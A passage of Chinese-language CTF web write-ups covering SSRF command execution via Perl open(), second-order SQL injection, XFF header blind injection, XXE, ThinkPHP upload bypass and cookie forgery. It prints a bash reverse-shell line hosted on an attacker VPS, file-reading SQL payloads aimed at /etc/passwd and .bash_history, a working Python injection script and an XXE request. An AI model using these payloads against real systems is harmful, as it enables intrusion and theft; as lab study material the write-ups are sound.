<p>然后运行 perl test.pl =&gt; ubuntu  , 可以看到这里执行了我们的linux系统命令,在open下,perl可以执行命令</p>
<p>如果perl的第二个参数(path) 可控,就能够任意代码执行了</p>
<p>perl 中 GET 对协议处理部分调用了 /usr/share/perl5/LWP/Protocol  下的各个pm模块, <code>file.pm</code> 中, path参数是完全可控的</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># URL OK, look at file</span></span><br><span class="line"><span class="keyword">my</span> $path  = $url-&gt;file;</span><br><span class="line"></span><br><span class="line"><span class="comment"># test file exists and is readable</span></span><br><span class="line"><span class="keyword">unless</span> (-e $path) &#123;</span><br><span class="line"><span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">              <span class="string">&quot;File `$path&#x27; does not exist&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment"># read the file</span></span><br><span class="line"><span class="keyword">if</span> ($method <span class="keyword">ne</span> <span class="string">&quot;HEAD&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">open</span>(F, $path) <span class="keyword">or</span> <span class="keyword">return</span> new</span><br><span class="line">    HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">           <span class="string">&quot;Cannot read file &#x27;$path&#x27;: $!&quot;</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>只不过这里先判断了file是否存在, 如果存在才会代码执行</p>
<p>方法三: Bash反弹shell, 在题目靶机能访问外网的情况</p>
<p>原理就是利用方法二</p>
<p>在vps上写一个shell.txt , 里面的内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;port 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?url&#x3D;http:&#x2F;&#x2F;yourvps&#x2F;&amp;filename&#x3D;a</span><br><span class="line">&#x2F;?url&#x3D;&amp;filename&#x3D;bash a|</span><br><span class="line">&#x2F;?url&#x3D;file:bash a|&amp;filename&#x3D;xxx</span><br></pre></td></tr></table></figure>

<p>只能说这种大型的国际比赛, 考的是平时积累和临时对问题的研究和处理能力</p>
<p>参考资料: </p>
<p><a target="_blank" rel="noopener" href="https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/ssrfme.md">https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/ssrfme.md</a></p>
<p><a target="_blank" rel="noopener" href="https://muouim.github.io/2019/08/02/SSRF/">https://muouim.github.io/2019/08/02/SSRF/</a></p>
<h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><ul>
<li>弱口令爆破</li>
<li>目录扫描/Git  源码泄露, 恢复</li>
<li>二次注入</li>
</ul>
<p>目录扫描发现 /.git/</p>
<p>Git 恢复用Githakcer : <a target="_blank" rel="noopener" href="https://github.com/wangyihang/githacker">https://github.com/wangyihang/githacker</a></p>
<p>cd 到下载下来的文件的目录, 然后执行<code>git log --reflog</code> , 找到有<code>refs/stash</code> 的commit</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200331132117.png"></p>
<p>然后再退出, 再执行<code>git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c</code> 得到恢复后的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM<span class="number">-0</span><span class="number">-15</span>-ubuntu:~/GitHacker/b99c6c2b<span class="number">-0</span>b53<span class="number">-4e62</span><span class="number">-8084</span><span class="number">-6e3225204</span>bfd_node3_buuoj_cn_$ cat write_do.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123; <span class="comment">// do 这个参数就是后面的case </span></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]); <span class="comment">// 转义特殊符号, 添加\</span></span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board //写入borad</span></span><br><span class="line"><span class="string">            set category = &#x27;$category&#x27;, // 先设置category</span></span><br><span class="line"><span class="string">                title = &#x27;$title&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;$content&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]); <span class="comment">// 这个id 就是帖子的id</span></span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;$bo_id&#x27;&quot;</span>; <span class="comment">// 再从board 中获取category的数据</span></span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>]; <span class="comment">// 针对category 再进行一次查询</span></span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]); <span class="comment">// 在评论的时候又对content进行了转义</span></span><br><span class="line">    $sql = <span class="string">&quot;insert into comment // 写入comment</span></span><br><span class="line"><span class="string">            set category = &#x27;$category&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;$content&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;$bo_id&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=$bo_id&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>login.php 直接根据题目的用户名去生成弱口令, 爆破得到zhangwei666 登陆成功</p>
<p>这个网站的功能是一个是发帖的功能, 另一个是评论的功能:  刚拿到题其实以为是XSS题, 知道扫目录才发现不对</p>
<p>在case 为 write 的时候, 就是发帖, 可以看到这里对我们的输入都采用了<code>addslashes()</code> 函数来处理了,然后再插入到数据库, 在第二次评论的时候又进行了一次处理, 从上面的代码中可以看到, 在第二次写入的时候,只对<code>content</code> 进行了一次<code>addslashes()</code> 函数处理, 而没有对category 进行处理, 故在第二次使用category的时候, 之前的<code>1\&#39;</code> 拿来用了</p>
<p>造成漏洞的代码: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]); <span class="string">&#x27;1\&#x27;order by 4#&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">$sql = &quot;select category from board where id=&#x27;</span>$bo_id<span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">$result = mysql_query($sql);</span></span><br><span class="line"><span class="string">$category = mysql_fetch_array($result)[&#x27;</span>category<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"> $sql = &quot;insert into comment // 写入comment</span></span><br><span class="line"><span class="string">           set category = &#x27;</span>$category<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">               content = &#x27;</span>$content<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">               bo_id = &#x27;</span>$bo_id<span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">   $result = mysql_query($sql);</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>这里要注意一点的就是, 这里的多条SQL语句, <code>#</code> 单行注释是肯定行不通的, <code>/* */</code> 使用多行注释来注释掉content查询字段</p>
<p><code>123&#39;,content=user(),/*</code> =&gt; <code>&quot;insert into comment set category=&#39;123&#39;,content=user(),/*content=&#39;$content&#39;,bo_id=&#39;$bo_id&#39;&quot;;</code></p>
<p>评论的地方: </p>
<p><code>*/#</code> =&gt; <code>&quot;insert into comment set category=&#39;123&#39;,content=user(),/*content=&#39;*/#&#39;,bo_id=&#39;$bo_id&#39;;&quot;</code></p>
<p>=&gt; <code>&quot;insert into comment set category=&#39;123&#39;,content=user(),bo_id=&#39;$bo_id&#39;&quot;;</code></p>
<p>原本的content字段就被强行给干掉了,sql语句执行我们的恶意sql查询语句</p>
<p>查数据库为ctf , <code>1&#39;,content=(select (table_name)from information_schema.tables where table_schema=&#39;ctf&#39;),/*</code></p>
<p>想查查表名, 发现读不出来</p>
<ul>
<li>查看www 用户的目录</li>
</ul>
<p><code>1&#39;,content=(select(load_file(&#39;/etc/passwd&#39;))),/*</code></p>
<p>为<code>/home</code> 目录</p>
<ul>
<li>读取<code>.bash_history</code> 文件</li>
</ul>
<p><code>1&#39;,content=(select(load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F; </span><br><span class="line">unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html &#x2F;var&#x2F;www&#x2F; </span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F; </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 start </span><br></pre></td></tr></table></figure>

<p>可以看到这里先进行了一次cp 然后在 rm , 故原来的文件中存在<code>.Ds_Store</code> ????</p>
<ul>
<li>读取<code>/tmp/html/.Ds_Store</code> (因为环境为docker, 故为tmp目录)</li>
</ul>
<p><code>1&#39;,content=(select(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p>
<p>只能读到一些不可显字符, 因为这个会使我的search.xml报错, 故不贴出来了</p>
<p>可以看到有不可显字符</p>
<p>转为hex 读取, 得到 一大串, 解码得到<code>flag_8946e1ff1ee3e40f.php</code> </p>
<ul>
<li>读flag</li>
</ul>
<p><code>1&#39;,content=(select(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p>
<p> 读不到, 继续hex编码 解码 读到flag</p>
<h1 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h1><ul>
<li>XFF 头注入</li>
</ul>
<p>官方wp: <a target="_blank" rel="noopener" href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Web/online_proxy/writeup/WriteUp.docx">https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Web/online_proxy/writeup/WriteUp.docx</a></p>
<p>一开始方向就偏了, 以为是SSRF, 其实fuzz 了之后, 只有http/https 协议可以用了, 那么就应该放弃ssrf了</p>
<p>照着题目的引导,输入, 查看源码能够看到注释中有ip 地址, </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎使用 Online Proxy。使用方法为 &#x2F;?url&#x3D;，例如 &#x2F;?url&#x3D;https:&#x2F;&#x2F;baidu.com&#x2F;。</span><br><span class="line">为了保障您的使用体验，我们可能收集您的使用信息，这些信息只会被用于提升我们的服务，请您放心。</span><br></pre></td></tr></table></figure>

<p>那么可能是将这个ip 记录到了数据库,那么就可能存在注入的问题了, 那么如何注入呢? 我们知道XFF是可以伪造ip的…</p>
<p>尝试修改XFF: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.041894912719727 s </span><br><span class="line"> Current Ip: 1qwe23 </span><br><span class="line">Last Ip: 174.0.222.75 --&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到,题目靶机的IP就变成了 Last Ip 了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赵师傅太强了...</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node3.buuoj.cn:27909/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span>(<span class="params">sql</span>):</span></span><br><span class="line">    print(<span class="string">&quot;[*]请求语句: &quot;</span> + sql)</span><br><span class="line">    return_result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;0&#x27;|length((&quot;</span> + sql + <span class="string">&quot;))|&#x27;0&quot;</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)</span><br><span class="line">    r = s.get(url, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;tql&#x27;</span>&#125;)</span><br><span class="line">    r = s.get(url, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;tql&#x27;</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">&quot;Last Ip: &quot;</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">&quot; --&gt;&quot;</span>, start_pos)</span><br><span class="line">    length = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">&quot;[+]长度: &quot;</span> + str(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;|conv(hex(substr((&quot;</span> + sql + <span class="string">&quot;),&quot;</span> + str(i) + <span class="string">&quot;,5)),16,10)|&#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line">        r = s.get(url, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)</span><br><span class="line">        r = s.get(url, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;tql&#x27;</span>&#125;)</span><br><span class="line">        r = s.get(url, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;tql&#x27;</span>&#125;)</span><br><span class="line">        start_pos = r.text.find(<span class="string">&quot;Last Ip: &quot;</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">&quot; --&gt;&quot;</span>, start_pos)</span><br><span class="line">        result = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        return_result += bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;[+]位置 &quot;</span> + str(i) + <span class="string">&quot; 请求五位成功:&quot;</span> + bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库 = &gt; information_schema,test,performance_schema,ctftraining,mysql,F4l9_D4t4B45e,ctf</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功: &quot; + execute_sql(&quot;select group_concat(schema_name) from information_schema.schemata&quot;))</span></span><br><span class="line"><span class="comment"># 获取数据库表 =&gt; F4l9_t4b1e</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功: &quot; + execute_sql(&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;&quot;))</span></span><br><span class="line"><span class="comment"># 获取数据库表 =&gt; F4l9_C01uMn</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功: &quot; + execute_sql(&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;&quot;))</span></span><br><span class="line"><span class="comment"># 获取flag</span></span><br><span class="line">print(<span class="string">&quot;[+]获取成功: &quot;</span> + execute_sql(<span class="string">&quot;select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e&quot;</span>))</span><br></pre></td></tr></table></figure>



<p>这位兄弟的原理解释的不错: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102636793?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/weixin_44077544/article/details/102636793?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>
<blockquote>
<p>先输入 1’ or ‘1 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or ‘1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。</p>
</blockquote>
<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><ul>
<li>XXE</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;doLogin.php HTTP&#x2F;1.1</span><br><span class="line">Host: 42eddbfc-ac91-42fe-a6fe-8fb2471f7e66.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0</span><br><span class="line">Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;xml;charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 136</span><br><span class="line">Origin: http:&#x2F;&#x2F;42eddbfc-ac91-42fe-a6fe-8fb2471f7e66.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;42eddbfc-ac91-42fe-a6fe-8fb2471f7e66.node3.buuoj.cn&#x2F;</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ctf [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;b;&lt;&#x2F;username&gt;&lt;password&gt;0&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

<h1 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h1><ul>
<li>Thinkphp 的多文件上传(当upload()函数不传参数时,默认为多文件上传,整个$_FILES数组的文件都会被上传)</li>
<li>uniqid 设置文件路径不合理, 存在可爆破的可能性</li>
<li><code>$upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> allowExts 方法用于检测文件名就没用了, 因为这种情况默认只检查一次, 而多文件上传时就绕过了文件检测</li>
</ul>
<p>思路 : </p>
<ol>
<li>获取文件上传的默认路径</li>
<li>伪造文件上传的HTTP Request 请求包</li>
<li>上传多个文件</li>
<li>对文件名进行爆破(因为连续上传的文件,uniqid处理是微秒级别的,所以差别不会太大)</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> uniqid();</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> uniqid();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    <span class="comment">// 5e869d0cb5678</span></span><br><span class="line">	<span class="comment">// 5e869d0cb5701</span></span><br></pre></td></tr></table></figure>

<p>可以看到, 只有后面三位数字的不同, 所以爆破文件名的时候对后面三位进行爆破即可, 本题需要爆破6位</p>
<h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><ul>
<li>cookie 伪造</li>
</ul>
<p>用给了的账号登陆进去, 查看cookie 改为admin, 拿flag</p>
